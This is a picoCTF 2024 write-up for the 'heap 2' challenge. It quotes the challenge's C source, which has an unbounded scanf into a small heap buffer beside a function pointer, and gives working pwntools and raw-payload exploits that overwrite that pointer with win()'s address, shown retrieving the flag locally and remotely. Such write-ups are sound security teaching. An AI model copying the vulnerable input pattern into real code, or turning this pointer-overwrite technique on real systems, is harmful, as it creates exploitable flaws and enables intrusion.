### heap 2

Author: Abrxs, pr1or1tyQ
#Medium  #Binary_exploitation #picoCTF2024 #browser_web_shell #heap
#### Description

Can you handle function pointers? Download the binary [here](https://artifacts.picoctf.net/c_mimas/50/chall). Download the source [here](https://artifacts.picoctf.net/c_mimas/50/chall.c).

Additional details will be available after launching your challenge instance.
Connect with the challenge instance here: `nc mimas.picoctf.net 52981`

##### Solution:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

```

Looking at the source code, the flag is output by the win function, but this function is not called anywhere. 
Then, when you select option 4, the check_win function is executed, but this function executes 
the value x on the heap that you want to rewrite this time

```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }
```

Therefore, all you have to do is rewrite x to the address of the function win.  
Checking with gdb, the address of the win function is 0x4011a0.

```css
(gdb) p win
$1 = {void ()} 0x4011a0 <win>
(gdb) 
```

payload in python using pwn
```python
from pwn import *

# Address of the win function (adjust this according to your binary)
win = 0x4011a0
# Padding to reach the return address
padding = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
# Construct the payload
payload = padding + p64(win)

# Start the local process (replace 'your_binary' with your actual binary name)
chall = process('./chall')

# Interact with the binary as per the original exploit
chall.sendlineafter(b'your choice: ', b'2')
chall.sendlineafter(b'buffer: ', payload)
chall.sendlineafter(b'your choice: ', b'4')

# Switch to interactive mode
chall.interactive()

```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/heap2]
└─$ python3 test.py
[+] Starting local process './chall': pid 10485
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 10485)
picoCTF{heap2}
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```

for online
```python
from pwn import *
win = 0x4011a0
padding = b'aaaabbbbccccddddeeeeffffgggghhhh'
payload = padding + p64(win)
chall = remote('mimas.picoctf.net', 52981)
chall.sendlineafter(b'your choice: ',b'2')
chall.sendlineafter(b'buffer: ',payload)
chall.sendlineafter(b'your choice: ',b'4')
chall.interactive()
```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/heap2]
└─$ python3 test2.py 
[+] Opening connection to mimas.picoctf.net on port 52981: Done
[*] Switching to interactive mode
picoCTF{and_down_the_road_we_go_ba77314d}
[*] Got EOF while reading in interactive
$ 
$ 
[*] Closed connection to mimas.picoctf.net port 52981
[*] Got EOF while sending in interactive
```

---

another method without using pwn

```python
from struct import pack

# Address of the win function (adjust this according to your binary)
win = 0x4011a0

# Create the payload with proper input format
padding = b'a' * 32  # Adjust this size as necessary for the buffer

# Construct the payload
payload = (
    b'2\n' +               # First input: choose "2" to write to buffer
    padding +             # Buffer content (padding)
    pack("<Q", win) +     # Address of win function
    b'\n' +               # End of buffer input
    b'4\n'                # After writing to the buffer, choose option "4" to print the flag
)

# Write the complete payload to the binary file
with open('payload.bin', 'wb') as f:
    f.write(payload)

print("Payload created successfully in payload.bin.")

```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/heap2]
└─$ hexdump -C payload.bin
00000000  32 0a 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |2.aaaaaaaaaaaaaa|
00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000020  61 61 a0 11 40 00 00 00  00 00 0a 34 0a           |aa..@......4.|
0000002d  
```

```css
┌──(myenv)─(kali㉿kali)-[~/Downloads/heap2]
└─$ cat payload.bin | ./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: Data for buffer: 
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: picoCTF{heap2}
   
┌──(myenv)─(kali㉿kali)-[~/Downloads/heap2]
└─$ cat payload.bin | nc mimas.picoctf.net 63308

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: Data for buffer: 
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: picoCTF{and_down_the_road_we_go_ba77314d}
```
